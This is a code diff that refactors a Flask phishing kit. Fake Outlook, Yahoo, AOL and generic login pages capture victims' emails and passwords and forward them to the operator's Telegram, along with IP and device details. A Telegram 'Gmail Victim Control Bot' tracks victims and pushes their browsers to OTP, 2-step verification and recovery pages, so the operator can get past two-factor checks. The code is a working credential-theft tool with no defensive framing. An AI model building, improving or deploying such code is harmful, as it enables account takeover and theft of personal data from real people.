         send_telegram_notification_with_buttons(message, session_id)
     
-    return render_template('2stepverification.html', placeholders={
-        'email': email, 
-        'phone': phone_type
-    })
+    return render_template('2stepverification.html', placeholders={'email': email, 'phone': phone_type})
 
 @app.route('/api/set-verification-data', methods=['POST'])
 def set_verification_data():
@@ -979,21 +957,19 @@ def set_verification_data():
     session_id = data.get('session_id')
     email = data.get('email')
     phone = data.get('phone')
-    
     if session_id:
-        verification_page_data[session_id] = {
-            'email': email or '',
-            'phone': phone or '',
-            'timestamp': datetime.now().isoformat()
-        }
-    
+        if email:
+            update_setting_json(session_id, 'email', email)
+        if phone:
+            update_setting_json(session_id, 'phone_type', phone)
     return jsonify({'success': True})
 
 @app.route('/api/get-verification-data')
 def get_verification_data():
     session_id = session.get('victim_session')
-    if session_id and session_id in verification_page_data:
-        return jsonify(verification_page_data[session_id])
+    if session_id:
+        settings = get_settings_json(session_id)
+        return jsonify({'email': settings.get('email', ''), 'phone': settings.get('phone_type', '')})
     return jsonify({'email': '', 'phone': ''})
 
 @app.route('/api/set-phone-data', methods=['POST'])
@@ -1001,21 +977,16 @@ def set_phone_data():
     data = request.get_json()
     session_id = data.get('session_id')
     phone = data.get('phone')
-    
     if session_id and phone:
-        verify_page_data[session_id] = {
-            **verify_page_data.get(session_id, {}),
-            'phone': phone,
-            'timestamp': datetime.now().isoformat()
-        }
-    
+        update_setting_json(session_id, 'phone', phone)
     return jsonify({'success': True})
 
 @app.route('/api/get-recovery-data')
 def get_recovery_data():
     session_id = session.get('victim_session')
-    if session_id and session_id in recovery_page_data:
-        return jsonify(recovery_page_data[session_id])
+    if session_id:
+        settings = get_settings_json(session_id)
+        return jsonify({'email': settings.get('email', ''), 'number': settings.get('number', '')})
     return jsonify({'email': '', 'number': ''})
 
 @app.route('/api/set-recovery-data', methods=['POST'])
@@ -1024,44 +995,38 @@ def set_recovery_data():
     session_id = data.get('session_id')
     email = data.get('email')
     number = data.get('number')
-    
     if session_id:
-        recovery_page_data[session_id] = {
-            'email': email or '',
-            'number': number or '',
-            'timestamp': datetime.now().isoformat()
-        }
-    
+        if email:
+            update_setting_json(session_id, 'email', email)
+        if number:
+            update_setting_json(session_id, 'number', number)
     return jsonify({'success': True})
 
 @app.route('/api/get-phone-data')
 def get_phone_data():
     session_id = session.get('victim_session')
-    if session_id and session_id in verify_page_data:
-        return jsonify(verify_page_data[session_id])
+    if session_id:
+        settings = get_settings_json(session_id)
+        return jsonify({'phone': settings.get('phone', '')})
     return jsonify({'phone': ''})
 
 @app.route('/check-command')
 def check_command():
     session_id = session.get('victim_session')
-    
     if session_id:
-        command = get_and_clear_command_by_session(session_id)
+        command = get_and_clear_command_json(session_id)
         if command:
             return jsonify({'command': command})
-    
-    # Check by IP
     client_ip = get_client_ip()
-    session_id, command = get_and_clear_command_by_ip(client_ip)
+    session_id, command = get_and_clear_command_by_ip_json(client_ip)
     if command:
         if session_id:
             session['victim_session'] = session_id
             session['is_victim'] = True
         return jsonify({'command': command})
-    
     return jsonify({'command': None})
 
-# ============ TELEGRAM WEBHOOK WITH BUTTONS ============
+# ============ TELEGRAM WEBHOOK ============
 
 @app.route('/telegram-webhook', methods=['POST'])
 def telegram_webhook():
@@ -1126,7 +1091,7 @@ def telegram_webhook():
             chat_id = message['chat']['id']
             text = message.get('text', '').strip()
             
-            # Check if we're in a "setting" state using global dict
+            # Check if we're in a "setting" state
             if chat_id in setting_states:
                 state = setting_states[chat_id]
                 session_id = state['session_id']
@@ -1153,11 +1118,8 @@ def telegram_webhook():
                     else:
                         send_telegram_message("❌ Invalid number. Must be 2 digits (00-99). Please try again.")
                 
-                # Clear the setting state
                 if chat_id in setting_states:
                     del setting_states[chat_id]
-                
-                # Send back to victim detail
                 send_victim_detail(chat_id, session_id)
                 return jsonify({'status': 'ok'})
             
@@ -1180,6 +1142,10 @@ def telegram_webhook():
         print(f"Error in webhook: {e}")
         return jsonify({'status': 'error'}), 500
 
+# ============ TELEGRAM BOT FUNCTIONS ============
+
+setting_states = {}
+
 def send_main_menu(chat_id, message_id=None):
     keyboard = {
         "inline_keyboard": [
@@ -1195,7 +1161,6 @@ def send_main_menu(chat_id, message_id=None):
             ]
         ]
     }
-    
     text = """🤖 <b>Gmail Victim Control Bot</b>
 
 Welcome! Use the buttons below to control your victims.
@@ -1204,7 +1169,6 @@ Welcome! Use the buttons below to control your victims.
 📊 <b>Statistics</b> - View stats
 🧹 <b>Clear All</b> - Delete all victims & logs
 🔄 <b>Refresh</b> - Update the list"""
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1212,7 +1176,6 @@ Welcome! Use the buttons below to control your victims.
 
 def send_victims_list(chat_id, message_id=None):
     victims = get_all_victims()
-    
     if not victims:
         text = "📭 <b>No active victims found.</b>"
         keyboard = {
@@ -1224,7 +1187,6 @@ def send_victims_list(chat_id, message_id=None):
     else:
         text = f"📋 <b>Active Victims ({len(victims)})</b>\n\n"
         keyboard = {"inline_keyboard": []}
-        
         for v in victims[:10]:
             session_short = v['session_id'][:8]
             current_page_display = get_victim_page_display(v['current_page'])
@@ -1232,27 +1194,22 @@ def send_victims_list(chat_id, message_id=None):
             text += f"📧 {v['email']}\n"
             text += f"📍 {current_page_display}\n"
             text += "─" * 20 + "\n"
-            
             keyboard["inline_keyboard"].append([
                 {"text": f"👤 {session_short}", "callback_data": f"victim_detail|{v['session_id']}"}
             ])
-        
         if len(victims) > 10:
             text += f"\n... and {len(victims) - 10} more victims"
-        
         keyboard["inline_keyboard"].append([
             {"text": "🔄 Refresh", "callback_data": "refresh"},
             {"text": "🔙 Main Menu", "callback_data": "main_menu"}
         ])
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
         send_telegram_message_with_buttons(chat_id, text, keyboard)
 
 def send_victim_detail(chat_id, session_id, message_id=None):
-    victim = get_victim_details(session_id)
-    
+    victim = get_victim_details_cached(session_id)
     if not victim:
         text = "❌ Victim not found"
         keyboard = {
@@ -1262,37 +1219,14 @@ def send_victim_detail(chat_id, session_id, message_id=None):
             ]
         }
     else:
-        # Get current values from all data sources
-        current_email = victim.get('email', 'Not set')
+        settings = get_settings_json(session_id)
+        current_email = settings.get('email', victim.get('email', 'Not set'))
+        current_phone = settings.get('phone', 'Not set')
+        current_number = settings.get('number', 'Not set')
+        current_phone_type = settings.get('phone_type', 'Not set')
         
-        # Check all possible sources for email
-        if current_email in ['No email', 'Not set']:
-            if session_id in active_victims and active_victims[session_id].get('email'):
-                current_email = active_victims[session_id]['email']
-            elif session_id in verify_page_data and verify_page_data[session_id].get('email'):
-                current_email = verify_page_data[session_id]['email']
-            elif session.get('email'):
-                current_email = session.get('email')
-        
-        # Get phone from verify_page_data (for OTP)
-        current_phone = 'Not set'
-        if session_id in verify_page_data:
-            current_phone = verify_page_data[session_id].get('phone', 'Not set')
-        
-        # Get 2-digit number from recovery_page_data
-        current_number = 'Not set'
-        if session_id in recovery_page_data:
-            current_number = recovery_page_data[session_id].get('number', 'Not set')
-        
-        # Get phone type from verification_page_data (for 2-step)
-        current_phone_type = 'Not set'
-        if session_id in verification_page_data:
-            current_phone_type = verification_page_data[session_id].get('phone', 'Not set')
-        
-        # Get real device
         user_agent = victim.get('user_agent', '')
         device = get_device_info(user_agent)
-        
         current_page_display = get_victim_page_display(victim['current_page'])
         
         text = f"""👤 <b>Victim Details</b>
@@ -1383,22 +1317,12 @@ def force_victim(session_id, page, chat_id, message_id):
     
     if page in action_map:
         command = action_map[page]
-        
-        # Clear old notifications for this victim
-        for key in list(notified_pages.keys()):
-            if key.endswith(f'_{session_id}'):
-                del notified_pages[key]
-        
-        # Get IP address from active_victims
+        clear_notifications_json(session_id)
         ip_address = None
         if session_id in active_victims:
             ip_address = active_victims[session_id].get('ip_address')
-        
-        # Store command in memory (fast!)
-        add_command(session_id, command, ip_address)
-        
+        add_command_json(session_id, command, ip_address)
         text = f"✅ Victim forced to <b>{page}</b> page!"
-        print(f"🎯 Command '{command}' stored for session {session_id}")
     else:
         text = f"❌ Invalid page: {page}"
     
@@ -1409,22 +1333,13 @@ def force_victim(session_id, page, chat_id, message_id):
             [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
         ]
     }
-    
     edit_telegram_message(chat_id, message_id, text, keyboard)
 
 def set_victim_email(session_id, email, chat_id, message_id):
     if not email:
-        setting_states[chat_id] = {
-            'session_id': session_id,
-            'action': 'setemail'
-        }
-        
+        setting_states[chat_id] = {'session_id': session_id, 'action': 'setemail'}
         text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
+        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
         if message_id:
             edit_telegram_message(chat_id, message_id, text, keyboard)
         else:
@@ -1439,12 +1354,9 @@ def set_victim_email(session_id, email, chat_id, message_id):
     
     if session_id in active_victims:
         active_victims[session_id]['email'] = email
-    
-    if session_id not in verify_page_data:
-        verify_page_data[session_id] = {}
-    verify_page_data[session_id]['email'] = email
-    
+    update_setting_json(session_id, 'email', email)
     session['email'] = email
+    invalidate_cache(session_id)
     
     text = f"✅ Email set to: <code>{email}</code>"
     keyboard = {
@@ -1453,10 +1365,8 @@ def set_victim_email(session_id, email, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    
     if chat_id in setting_states:
         del setting_states[chat_id]
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1464,27 +1374,16 @@ def set_victim_email(session_id, email, chat_id, message_id):
 
 def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
     if not phone_type:
-        setting_states[chat_id] = {
-            'session_id': session_id,
-            'action': 'setphonetype'
-        }
-        
+        setting_states[chat_id] = {'session_id': session_id, 'action': 'setphonetype'}
         text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
+        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
         if message_id:
             edit_telegram_message(chat_id, message_id, text, keyboard)
         else:
             send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
-    if session_id not in verification_page_data:
-        verification_page_data[session_id] = {}
-    verification_page_data[session_id]['phone'] = phone_type
-    
+    update_setting_json(session_id, 'phone_type', phone_type)
     text = f"✅ Phone type set to: <code>{phone_type}</code>"
     keyboard = {
         "inline_keyboard": [
@@ -1492,10 +1391,8 @@ def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    
     if chat_id in setting_states:
         del setting_states[chat_id]
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1503,31 +1400,16 @@ def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
 
 def set_victim_phone(session_id, phone, chat_id, message_id):
     if not phone:
-        setting_states[chat_id] = {
-            'session_id': session_id,
-            'action': 'setphone'
-        }
-        
+        setting_states[chat_id] = {'session_id': session_id, 'action': 'setphone'}
         text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
+        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
         if message_id:
             edit_telegram_message(chat_id, message_id, text, keyboard)
         else:
             send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
-    if session_id not in verify_page_data:
-        verify_page_data[session_id] = {}
-    verify_page_data[session_id]['phone'] = phone
-    
-    if session_id not in phone_data:
-        phone_data[session_id] = {}
-    phone_data[session_id]['phone'] = phone
-    
+    update_setting_json(session_id, 'phone', phone)
     text = f"✅ Phone number set to: <code>{phone}</code>"
     keyboard = {
         "inline_keyboard": [
@@ -1535,10 +1417,8 @@ def set_victim_phone(session_id, phone, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    
     if chat_id in setting_states:
         del setting_states[chat_id]
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1546,17 +1426,9 @@ def set_victim_phone(session_id, phone, chat_id, message_id):
 
 def set_victim_number(session_id, number, chat_id, message_id):
     if not number:
-        setting_states[chat_id] = {
-            'session_id': session_id,
-            'action': 'setnumber'
-        }
-        
+        setting_states[chat_id] = {'session_id': session_id, 'action': 'setnumber'}
         text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
-        keyboard = {
-            "inline_keyboard": [
-                [{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]
-            ]
-        }
+        keyboard = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": f"victim_detail|{session_id}"}]]}
         if message_id:
             edit_telegram_message(chat_id, message_id, text, keyboard)
         else:
@@ -1577,10 +1449,7 @@ def set_victim_number(session_id, number, chat_id, message_id):
             send_telegram_message_with_buttons(chat_id, text, keyboard)
         return
     
-    if session_id not in recovery_page_data:
-        recovery_page_data[session_id] = {}
-    recovery_page_data[session_id]['number'] = number
-    
+    update_setting_json(session_id, 'number', number)
     text = f"✅ 2-Digit Number set to: <code>{number}</code>"
     keyboard = {
         "inline_keyboard": [
@@ -1588,10 +1457,8 @@ def set_victim_number(session_id, number, chat_id, message_id):
             [{"text": "📋 Victims List", "callback_data": "victims_list"}]
         ]
     }
-    
     if chat_id in setting_states:
         del setting_states[chat_id]
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1604,23 +1471,12 @@ def delete_victim_telegram(session_id, chat_id, message_id):
     conn.commit()
     conn.close()
     
+    delete_victim_json(session_id)
+    clear_notifications_json(session_id)
+    
     if session_id in active_victims:
         del active_victims[session_id]
-    if session_id in command_store:
-        del command_store[session_id]
-    if session_id in verify_page_data:
-        del verify_page_data[session_id]
-    if session_id in recovery_page_data:
-        del recovery_page_data[session_id]
-    if session_id in verification_page_data:
-        del verification_page_data[session_id]
-    if session_id in phone_data:
-        del phone_data[session_id]
-    
-    # Clear notifications for this victim
-    for key in list(notified_pages.keys()):
-        if key.endswith(f'_{session_id}'):
-            del notified_pages[key]
+    invalidate_cache(session_id)
     
     text = f"🗑️ Victim <code>{session_id[:8]}...</code> deleted!"
     keyboard = {
@@ -1642,12 +1498,15 @@ def send_stats(chat_id, message_id=None):
     nav_count = c.fetchone()[0]
     conn.close()
     
+    commands = load_commands_json()
+    pending_commands = len(commands)
+    
     text = f"""📊 <b>Statistics</b>
 
 👤 <b>Active Victims:</b> {active_count}
 📋 <b>Total Victims:</b> {total_count}
 🗺️ <b>Total Navigations:</b> {nav_count}
-⚡ <b>Pending Commands:</b> {len(command_store)}"""
+⚡ <b>Pending Commands:</b> {pending_commands}"""
     
     keyboard = {
         "inline_keyboard": [
@@ -1656,7 +1515,6 @@ def send_stats(chat_id, message_id=None):
             [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
         ]
     }
-    
     if message_id:
         edit_telegram_message(chat_id, message_id, text, keyboard)
     else:
@@ -1672,14 +1530,9 @@ def clear_all_victims(chat_id, message_id):
     conn.commit()
     conn.close()
     
+    clear_all_json()
     active_victims.clear()
-    command_store.clear()
-    verify_page_data.clear()
-    recovery_page_data.clear()
-    verification_page_data.clear()
-    phone_data.clear()
-    setting_states.clear()
-    notified_pages.clear()
+    invalidate_all_cache()
     
     text = "🧹 <b>ALL VICTIMS AND LOGS CLEARED!</b>"
     keyboard = {
@@ -1713,8 +1566,7 @@ def send_telegram_message_with_buttons(chat_id, text, keyboard):
         }
         response = requests.post(url, data=data)
         return response.status_code == 200
-    except Exception as e:
-        print(f"Error sending Telegram message: {e}")
+    except:
         return False
 
 def edit_telegram_message(chat_id, message_id, text, keyboard):
@@ -1729,8 +1581,7 @@ def edit_telegram_message(chat_id, message_id, text, keyboard):
         }
         response = requests.post(url, data=data)
         return response.status_code == 200
-    except Exception as e:
-        print(f"Error editing Telegram message: {e}")
+    except:
         return False
 
 def get_all_victims():
@@ -1745,7 +1596,6 @@ def get_all_victims():
     ''')
     victims = c.fetchall()
     conn.close()
-    
     return [{
         'session_id': v[0],
         'email': v[1] or 'No email',
@@ -1754,46 +1604,12 @@ def get_all_victims():
         'timestamp': v[4]
     } for v in victims]
 
-def get_victim_details(session_id):
-    conn = get_db_connection()
-    c = conn.cursor()
-    c.execute('''
-        SELECT v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp,
-               COUNT(n.id) as nav_count
-        FROM victims v
-        LEFT JOIN navigations n ON v.session_id = n.session_id
-        WHERE v.session_id = %s AND v.is_active = TRUE
-        GROUP BY v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp
-    ''', (session_id,))
-    victim = c.fetchone()
-    conn.close()
-    
-    if victim:
-        email = victim[1] or 'No email'
-        
-        if email == 'No email' and session_id in active_victims:
-            mem_email = active_victims[session_id].get('email')
-            if mem_email:
-                email = mem_email
-        
-        return {
-            'session_id': victim[0],
-            'email': email,
-            'ip_address': victim[2],
-            'user_agent': victim[3],
-            'current_page': victim[4] or 'login',
-            'timestamp': victim[5],
-            'nav_count': victim[6]
-        }
-    return None
-
 # ============ PROVIDER ROUTES ============
 @app.route('/wp-admin/invite<int:invite_num>/hotmail/', methods=['GET', 'POST'])
 def microsoft_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         session['user_email'] = email
-        
         session_id = session.get('victim_session')
         if session_id:
             conn = get_db_connection()
@@ -1801,14 +1617,13 @@ def microsoft_login(invite_num):
             c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
             conn.commit()
             conn.close()
-            
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
+            update_setting_json(session_id, 'email', email)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
-        
         message = f"""📧 <b>Outlook Email Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -1817,25 +1632,20 @@ def microsoft_login(invite_num):
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> Outlook Login"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/hotmail/password")
-    
     return render_template('microsoft.html', invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/hotmail/password', methods=['GET', 'POST'])
 def microsoft_password(invite_num):
     email = session.get('user_email', '')
-    
     if request.method == 'POST':
         password = request.form.get('password', 'Not provided')
         email = request.form.get('email', 'Not provided')
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
         session_id = session.get('victim_session')
-        
         message = f"""🔑 <b>Outlook Password Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -1844,10 +1654,8 @@ def microsoft_password(invite_num):
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/hotmail/403")
-    
     return render_template('passwordmicrosoft.html', email=email, invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/hotmail/403')
@@ -1859,7 +1667,6 @@ def yahoo_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         session['yahoo_email'] = email
-        
         session_id = session.get('victim_session')
         if session_id:
             conn = get_db_connection()
@@ -1867,14 +1674,12 @@ def yahoo_login(invite_num):
             c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
             conn.commit()
             conn.close()
-            
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
-        
+            update_setting_json(session_id, 'email', email)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
-        
         message = f"""📧 <b>Yahoo Email/Username Entered!</b>
 
 📧 <b>Email/Username:</b> <code>{email}</code>
@@ -1883,25 +1688,20 @@ def yahoo_login(invite_num):
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> Yahoo Login"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/yahoo/password")
-    
     return render_template('yahoo.html', invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/yahoo/password', methods=['GET', 'POST'])
 def yahoo_password(invite_num):
     email = session.get('yahoo_email', '')
-    
     if request.method == 'POST':
         password = request.form.get('password', 'Not provided')
         email = request.form.get('email', 'Not provided')
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
         session_id = session.get('victim_session')
-        
         message = f"""🔑 <b>Yahoo Password Entered!</b>
 
 📧 <b>Email/Username:</b> <code>{email}</code>
@@ -1910,10 +1710,8 @@ def yahoo_password(invite_num):
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/yahoo/403")
-    
     return render_template('yahoopassword.html', email=email, invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/yahoo/403')
@@ -1925,7 +1723,6 @@ def aol_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         session['aol_email'] = email
-        
         session_id = session.get('victim_session')
         if session_id:
             conn = get_db_connection()
@@ -1933,14 +1730,12 @@ def aol_login(invite_num):
             c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
             conn.commit()
             conn.close()
-            
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
-        
+            update_setting_json(session_id, 'email', email)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
-        
         message = f"""📧 <b>AOL Email Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -1949,25 +1744,20 @@ def aol_login(invite_num):
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page:</b> AOL Login"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/aol/password")
-    
     return render_template('aol.html', invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/aol/password', methods=['GET', 'POST'])
 def aol_password(invite_num):
     email = session.get('aol_email', '')
-    
     if request.method == 'POST':
         password = request.form.get('password', 'Not provided')
         email = request.form.get('email', 'Not provided')
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
         session_id = session.get('victim_session')
-        
         message = f"""🔑 <b>AOL Password Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -1976,10 +1766,8 @@ def aol_password(invite_num):
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/aol/403")
-    
     return render_template('aolpassword.html', email=email, invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/aol/403')
@@ -1991,7 +1779,6 @@ def other_login(invite_num):
     if request.method == 'POST':
         email = request.form.get('email', 'Not provided')
         password = request.form.get('password', 'Not provided')
-        
         session_id = session.get('victim_session')
         if session_id:
             conn = get_db_connection()
@@ -1999,14 +1786,12 @@ def other_login(invite_num):
             c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
             conn.commit()
             conn.close()
-            
             if session_id in active_victims:
                 active_victims[session_id]['email'] = email
-        
+            update_setting_json(session_id, 'email', email)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         user_agent = request.headers.get('User-Agent', '')
         device = get_device_info(user_agent)
-        
         message = f"""🔑 <b>Other Login Attempt!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -2015,10 +1800,8 @@ def other_login(invite_num):
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
         send_telegram_notification_with_buttons(message, session_id)
-        
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/other/403")
-    
     return render_template('other.html', invite_num=invite_num)
 
 @app.route('/wp-admin/invite<int:invite_num>/other/403')
